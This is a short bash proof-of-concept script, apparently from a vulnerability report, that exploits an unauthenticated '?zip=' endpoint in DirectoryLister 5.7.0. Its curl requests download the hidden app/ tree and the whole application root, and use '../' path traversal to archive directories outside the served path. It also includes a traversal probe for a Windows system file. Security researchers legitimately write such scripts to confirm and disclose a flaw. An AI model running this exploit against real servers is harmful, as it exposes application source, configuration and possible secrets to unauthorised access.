#!/usr/bin/env bash
# DL-02 PoC - DirectoryLister 5.7.0 (?zip= endpoint): unauthenticated archive download of
# arbitrary open_basedir-local directories; the hidden app_files list is never consulted
# and ../ traversal escapes files_path. Only gate: is_dir().
#
# Usage: ./poc-zip-traversal.sh [TARGET]
#        e.g. ./poc-zip-traversal.sh http://127.0.0.1:8000
set -u
TARGET="${1:-http://127.0.0.1:8000}"

echo "=== [B1] GET /?zip=app  (entire app/ tree although 'app' and 'app/**' are hidden app_files)"
curl -s -D headers_b1.txt -o app.zip "$TARGET/?zip=app"
grep -iE '^(HTTP|content-type|content-disposition)' headers_b1.txt
echo "  -> $(wc -c < app.zip) bytes; first entries:"
unzip -l app.zip 2>/dev/null | head -12 || echo "  (unzip not available; inspect app.zip manually)"

echo
echo "=== [B2] GET /?zip=.  (entire application root; dotfiles excluded by Symfony Finder default)"
curl -s -o root.zip -w '  -> HTTP %{http_code} (%{size_download} bytes)\n' "$TARGET/?zip=."

echo
echo "=== [C3] GET /?zip=../app  (directory OUTSIDE files_path; FILES_PATH deployment style)"
curl -s -o outside.zip -w '  -> HTTP %{http_code} (%{size_download} bytes)\n' "$TARGET/?zip=../app"

echo
echo "=== [scope control] GET /?file=../../../Windows/win.ini  (outside open_basedir -> expect 404)"
curl -s -o /dev/null -w '  -> HTTP %{http_code}\n' "$TARGET/?file=../../../Windows/win.ini"

rm -f headers_b1.txt
